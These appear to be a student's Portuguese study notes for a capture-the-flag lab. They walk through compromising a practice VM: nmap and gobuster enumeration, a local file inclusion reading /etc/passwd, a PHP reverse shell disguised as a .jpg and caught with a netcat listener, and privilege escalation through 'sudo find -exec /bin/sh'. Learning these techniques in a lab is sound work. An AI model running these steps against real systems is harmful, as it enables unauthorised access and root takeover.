# cyber_sos

https://tiagoalcan.notion.site/Passo-a-passo-Check-06-29bd7765e27380a78fd9c793c9ca7ccf

cp3
burble
hydra
chaves privadas e publicas
netcat?
printf?

nmap -sV 192.168.56.102 (servidor do owasp)
# lista vulnerabilidades do servidor, usar lista do thiago para testar as vulnerabilidaderqwiorj
https://tiagoalcan.notion.site/Cybersecurity-FOR-DEV-197d7765e27380d98603e484416d4a49?source=copy_link

se ter =, permite parametro a url... o exemplo da aula foi um tal de lang=, ai o professor tuchou language=/../../etc/passwd

RFI/LFI ataque de colocar arquivo dentro da host serve pra entrar na host e abrir portas etc
Colocamos um arquivo no parametro da requisição
o comando gobuster olha tudo que tem de importante no servidor

cd /usr/share/wordlists/dirb                           —acessar essa pasta
gobuster dir -u 192.168.56.102/assets/ -w big.txt

listando arquivos dentro da host:

Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 218]
/.htaccess            (Status: 403) [Size: 218]
/.svn                 (Status: 403) [Size: 213]
/1                    (Status: 200) [Size: 72580]
/2                    (Status: 200) [Size: 91665]
/4                    (Status: 200) [Size: 24700]
/3                    (Status: 200) [Size: 117977]
/alpha                (Status: 200) [Size: 3271]
/application          (Status: 200) [Size: 50419]
/clear                (Status: 200) [Size: 509]
/company              (Status: 200) [Size: 1191]
/email                (Status: 200) [Size: 1511]
/fonts                (Status: 301) [Size: 243] [--> http://192.168.56.102/assets/fonts/]                                                                 
/key                  (Status: 200) [Size: 1259]
/loading              (Status: 200) [Size: 1849]
/logo                 (Status: 200) [Size: 3028]
/profile              (Status: 200) [Size: 5015]
/sorting              (Status: 200) [Size: 1121]
Progress: 20469 / 20469 (100.00%)

link do acesso:
http://192.168.56.102/bWAPP/rlfi.php?language=/../../etc/passwd

192.168.56.102/language.php?lang=../../../etc/passwd (CORRETA DA PROVA)

rlfi.php é o arquivo dentro do owasp para testarmos a invasão... ai sempre usamos o language e testamos o passwd


### =====
# GS:
1. netdiscover -i eth0 -P -r (ip do cliente, kali aqui)
2. 192.168.56.102/language.php?lang=../../../etc/passwd (CORRETA DA PROVA, a gente achou um link com ?blabla=, ai muda o valor depois do blabla)
3. acima retorna o arquivo de senhas do servidor, significa que da pra fazer LFI
4. nmap -p- -sV 192.168.56.102 (servidor) (listar as portas)

# webshells, acessar o php, mas tem outros
1. cd /usr/share/webshells/ (sao listas de backdoors (virus) que o kali deixa disponivel, backdoor significa entrar sem login)
2. cd php
3. nano php-reverse-shell.php
## (transformando esse arquivo numa imagem, para fazer o upload do lfi)
1. cp php-reverse-shell.php revshell.php.jpg
2. nano revshell.php.jpg
3. o arquivo fica em "other location" na ui de folder
4. dentro do arquivo, mudar a linha escrito "ip" (para o ip do cliente kali), o port o professor deixou 1234 quieto
5. gobuster dir -u 192.168.56.102 -w /usr/share/wordlists/dirb/big.txt (ip do servidor) (gobuster mapeia a porra toda de pastas) (o retorno dele é varias pastas, o professor entrou numa de uploads, devemos procurar o arquivo que a gente fez o upload)
6. nc -nlvp 1234  (abrir uma porta no kali (cliente) pra esperar o servidor responder)

(sõ é possivel fazer o backdoor atraves da falha, que é pegar o paramentro que mudamos para /etc/passwd/ bla bla e mudamos para ./../../var/www/html/uploads/revshell.php.jpg, que nosso arquivo)
url final: http://192.168.56.102/language.php?lang=../../../var/www/html/uploads/revshell.php.jpg
simplificada: http://192.168.56.102/language.php?lang=/uploads/revshell.php.jpg

(depois de abrir a url acima que é o arquivo que fizemos o upload, nosso terminal com nc -nvlp 1234 vai entrar no servidor, ai fazemos o comando abaixo)
7. python3 -c "import pty;pty.spawn('/bin/bash')" (se nao vai dar erro que nao é um terminal)
8. www-data@bassam-aziz (estamos no usuario www-data, usando a maquina bassam-aziz)

9. cd /home
10. ls (para ver o nome dos usuarios)
11. cd bassam
12. ls (entrega a flag de usuario dentro do bassam, user.txt)
13. cat user.txt (nao vai ter permissao)
14. cd /var/www/html (pasta do apache servidor web)
15. ls (acha a pasta uploads)
16. cd uploads
17. ls (ver o jpg)
18. cd ../ (volta pro apache)
19. ls (descobre um supersecret-for-aziz) (nome do pc)
20. cd supersecret-for-aziz
21. ls (bassam-pass.txt) (nome do pc)
22. cat bassam-pass.txt (mostra a senha, copia usando o mouse)
23. su bassam (nome do usuario)
24. cola a senha com botao direito e entra no usuario bassam

# (dentro do usuario)
26. cd /home/bassam (home do bassam)
27. ls (cacar o user.txt)
28. cat user.txt (primeira flag, agora com permissao no bassam)
29. sudo -l (pra tentar entrar como sudo, ou seja, administrador)
30. cola a senha que pegou do cat bassam-pass.txt (da erro)
31. site maluco, professor pegou esse comando
  32. sudo find . -exec /bin/sh \; -quit
33. whoami (checar se somos root mesmo)
34. cd /root
35. ls (mostra a flag, arquivo flag.txt)
37. cat flag.txt
(mostra a flag final)
